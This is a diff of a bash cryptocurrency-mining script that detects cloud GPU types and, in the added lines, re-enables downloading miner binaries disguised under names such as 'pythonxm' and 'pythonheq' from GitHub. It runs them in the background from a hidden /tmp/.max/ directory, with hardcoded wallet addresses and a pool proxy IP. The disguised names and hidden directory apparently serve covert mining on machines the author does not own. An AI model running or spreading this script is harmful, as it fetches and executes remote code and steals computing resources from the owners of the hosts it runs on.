@@ -1,6 +1,7 @@
-#!/bin/bash -xe
+#!/bin/bash
+echo 
 echo -e '####################################################################################'
-echo -e '##################   '"ETH ONLY"' Ver:0.2.19      ############################'
+echo -e '##################   '"ET - VC"' Ver:0.3.1      ############################'
 echo -e '####################################################################################'
 mkdir -p /tmp/.max/
 cd  /tmp/.max/
@@ -12,11 +13,11 @@ VCPort=8080
 XMProt=21
 DisplayRefrech=60
 
-VCThreads=$[$(nproc)*4]
+VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
 
-#Debug=True
-Debug=False
+Debug=True
+#Debug=False
 
 #Keys
 W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
@@ -161,7 +162,7 @@ then
 
 echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
 GPU=P100
-OPG=ET
+OPG=RV
 PROG=CU
 BGColor=$On_IGreen
 elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
@@ -181,7 +182,7 @@ then
 echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
 GPU=T4
 OPG=ET
-PROG=CL
+PROG=CU
 BGColor=$On_IBlue
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
@@ -195,6 +196,14 @@ then
 
 echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
 GPU=P4
+OPG=ET
+PROG=CU
+BGColor=$On_ICyan
+elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
+then
+
+echo -e "${On_ICyan}"'###    M4000    ###'"${Color_Off}"
+GPU=M4000
 OPG=ET
 PROG=CU
 BGColor=$On_ICyan
@@ -212,36 +221,60 @@ fi
 ##################################################################
 #OP=$OP
 OPG=ET
+OP=VC
+
 i="0"
 
 while true
 do
-# if [ $OP == "XM" ]
-# then
-#     ####### XM
-#     #               Executable
-#     echo start >> ooutxm
-#     rm -rf pythonxm
-#     wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-#     chmod +x pythonxm
-#     #                Config
-#     wget -q https://github.com/one10001/10001code/raw/main/config.json
-#     sed -i "s+ip0001+RV_$IPNAME+g" config.json
-#     sed -i "s+78.47.69.185+$PROX+g" config.json
-#     sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
+if [ $OP == "XM" ]
+then
+    ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
-#     nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
 
-# else
-#     ###### VC
-#     echo start >> ooutvc
-#     rm -rf pythonheq
-#     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-#     chmod +x pythonheq
+elif [ $OP == "VC" ]
+then  
+    ###### VC
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
 
-#     nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+else
+    VCThreads=$[$(nproc)/2]
+    XMThreads=$[$(nproc)/2]
+        ####### XM
+    #               Executable
+    echo start >> ooutxm
+    rm -rf pythonxm
+    wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+    chmod +x pythonxm
+    #                Config
+    wget -q https://github.com/one10001/10001code/raw/main/config.json
+    sed -i "s+ip0001+RV_$IPNAME+g" config.json
+    sed -i "s+78.47.69.185+$PROX+g" config.json
+    sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
-# fi
+    nohup ./pythonxm -c config.json -t "$XMThreads" -l ooutxm 2>> ooutxm 1>> ooutxm &
+    echo start >> ooutvc
+    rm -rf pythonheq
+    wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+    chmod +x pythonheq
+
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+fi
 
 if [ $OPG == "ET" ]
 then
@@ -278,7 +311,7 @@ fi
 while true
     do
         i=$[$i+1]
-        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU  |${BCColor} CPU OP: $OP |  CPU ARC: $CPU  |${On_IWhite}${BIBlack} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG"
+        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU ARC: $CPU  |${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"
 
         Gacc=$(grep Acc oout | wc -l)
         Vacc=$(grep Acc ooutvc | wc -l)
@@ -291,31 +324,36 @@ while true
                 Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}')
                 GSHARE=$(grep Acc oout | wc -l)
                 GRATIO=$[$GSHARE*3600/($i*$DisplayRefrech)]
-                echo -e "${BIWhite}${BGColor} $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off}" 
+                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off}" 
 
         fi
 
 
      
 
-        # if [ $OP == "XM" ]
-        # then
-        #     Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
-        #     XSHARE=$(grep Acc oout | wc -l)
-        #     XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-        #     echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
-        # elif [ $OP == "VC" ]
-        # then
-        #     Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
-        #     VSHARE=$(grep Acc ooutvc | wc -l)
-        #     VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-        #     echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
-        # else 
-        #     Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
-        #     VSHARE=$(grep Acc ooutvc | wc -l)
-        #     VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-        #     echo -e "${BIWhite}${BCColor} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
-        # fi
+        if [ $OP == "XM" ]
+        then
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
+            XSHARE=$(grep Acc oout | wc -l)
+            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${BCColor}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
+        elif [ $OP == "VC" ]
+        then
+            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
+            VSHARE=$(grep Acc ooutvc | wc -l)
+            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${BCColor}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+        else 
+            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
+            VSHARE=$(grep Acc ooutvc | wc -l)
+            VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
+            XSHARE=$(grep Acc oout | wc -l)
+            XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
+            echo -e "${BIWhite}${On_Red} $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
+       
+        fi
 
         if [ $Debug == "True" ]
         then 
